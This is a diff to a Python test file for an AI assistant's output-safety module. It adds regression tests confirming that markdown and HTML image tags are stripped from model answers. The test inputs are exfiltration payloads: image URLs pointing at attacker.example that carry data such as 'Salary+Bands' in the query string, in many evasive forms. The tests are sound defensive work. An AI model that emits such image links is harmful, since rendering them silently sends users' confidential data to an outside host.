@@ -12,7 +12,7 @@ from tests.fakes import FakeLLM
 from workmind.core.context import RequestContext
 from workmind.modules.agents.department import ToolOutput, render_tool_outputs
 from workmind.modules.agents.research import research
-from workmind.modules.assistant.answer import answer, build_request, render_sources
+from workmind.modules.assistant.answer import answer, build_request, finish, render_sources
 from workmind.modules.assistant.safety import escape_tags, quote_markers, without_images
 from workmind.modules.conversations.runner import rewrite_question
 from workmind.modules.meetings.extract import render as render_transcript
@@ -22,7 +22,7 @@ from workmind.modules.tools.mcp_client import RemoteServer, RemoteServerConfig, 
 from workmind.modules.tools.registry import ToolRegistry
 from workmind.modules.work.workflows import quoted
 from workmind.modules.work.workflows import render as render_workflow
-from workmind.providers.llm import LLMMessage
+from workmind.providers.llm import LLMMessage, LLMUsage
 
 CTX = RequestContext(
     request_id="t",
@@ -114,6 +114,47 @@ def test_images_of_every_markdown_form_are_removed_and_links_are_kept() -> None:
     assert "http://h/3" not in clean
     assert "https://h/p" not in clean
     assert "[policy](https://intranet.example/leave)" in clean
+
+
+def test_images_that_commonmark_accepts_but_the_first_patterns_missed_are_removed() -> None:
+    # Regression: an alt text with a line break, nested brackets, and HTML that parsers turn
+    # into an image (<image>) or that loads a URL by itself all reached MCP `ask` callers.
+    forms = [
+        "Leave is 52 weeks. ![leave\npolicy](https://attacker.example/p.png?d=Salary+Bands)",
+        "![a [nested] alt](https://attacker.example/p.png?d=2)",
+        "![x](\n  https://attacker.example/p.png?d=3)",
+        '<image src="https://attacker.example/p.png?d=4">',
+        '<svg><image href="https://attacker.example/p.png?d=5"/></svg>',
+        '<video poster="https://attacker.example/p.png?d=6"></video>',
+        '<picture><source srcset="https://attacker.example/p.png?d=7"></picture>',
+        '<div style="background:url(https://attacker.example/p.png?d=8)">x</div>',
+        '<input type="image" src="https://attacker.example/p.png?d=9">',
+    ]
+
+    for form in forms:
+        clean = without_images(form)
+        assert "![" not in clean, form
+        assert "attacker.example" not in clean, (form, clean)
+        assert "[image removed" in clean, (form, clean)
+
+
+def test_a_blank_line_still_ends_the_alt_text_and_ordinary_text_is_kept() -> None:
+    text = "Use ![ and then\n\na new paragraph](not-an-image) and x < 5 and <b>bold</b>."
+
+    assert without_images(text).endswith(
+        "a new paragraph](not-an-image) and x < 5 and <b>bold</b>."
+    )
+
+
+def test_the_stored_answer_has_no_multiline_image() -> None:
+    result = finish(
+        "Leave is 52 weeks. ![leave\npolicy](https://attacker.example/p.png?d=Salary+Bands+2026)",
+        [],
+        LLMUsage(),
+    )
+
+    assert "attacker.example" not in result.text
+    assert "[image removed: leave\npolicy]" in result.text
 
 
 # --- LLM09: a document cannot pre-write citations --------------------------------------------
